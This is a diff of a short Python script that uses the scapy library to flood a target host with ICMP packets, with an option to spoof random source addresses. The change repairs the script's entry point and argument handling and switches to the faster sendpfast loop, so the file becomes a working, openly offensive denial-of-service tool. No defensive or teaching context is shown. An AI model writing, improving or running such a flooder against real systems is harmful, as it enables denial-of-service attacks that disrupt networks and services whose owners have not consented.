@@ -1,30 +1,19 @@
 #!/usr/bin/env python
-from scapy.all import IP, ICMP, send, RandIP
+from scapy.all import IP, ICMP, sendpfast, RandIP
 import sys
 import random
 
-def send_ping(dst_ip, src_ip):
+def ping_flood(dst_ip, src_ip, amount):
     icmp = IP(src=src_ip, dst=dst_ip) / ICMP()
-    send(icmp)
+    sendpfast(icmp, loop=amount)
 
-def ping_flood(amount, dst_ip, src_ip):
-    for i in range(amount):
-        send_ping(dst_ip, src_ip)
-
-def send_ping_spoofed(dst_ip):
-    send_ping(dst_ip, RandIP())
-
-def ping_flood_spoofed(amount, dst_ip):
-    for i in range(amount):
-        send_ping_spoofed(dst_ip)
-
-if __name__ == "main":
-    src_ip = sys.argv[2]
-    dst_ip = sys.argv[3]
-    amount = int(sys.argv[4])
+if __name__ == "__main__":
+    src_ip = sys.argv[1]
+    dst_ip = sys.argv[2]
+    amount = int(sys.argv[3])
     if src_ip == "spoof":
-        ping_flood_spoofed(amount, dst_ip)
-    else:
-        ping_flood(amount, dst_ip, src_ip)
+        src_ip = RandIP()
+    
+    ping_flood(dst_ip, src_ip, amount)
 
 
